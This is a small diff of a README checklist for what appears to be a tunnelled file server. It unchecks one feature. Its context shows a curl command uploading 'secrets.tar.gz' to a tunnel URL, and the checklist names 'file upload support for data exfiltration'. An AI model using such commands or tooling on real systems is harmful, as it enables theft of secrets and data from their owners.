@@ -135,7 +135,7 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
 ### 🌐 Server Features
 - [x] Display public tunnel URL clearly
 - [x] Serve files from a specified directory
-- [x] Web-based directory listing with download buttons
+- [ ] Web-based directory listing with download buttons
 - [x] File upload support for data exfiltration
 - [x] Log incoming HTTP requests (IP, User-Agent, Time)
 
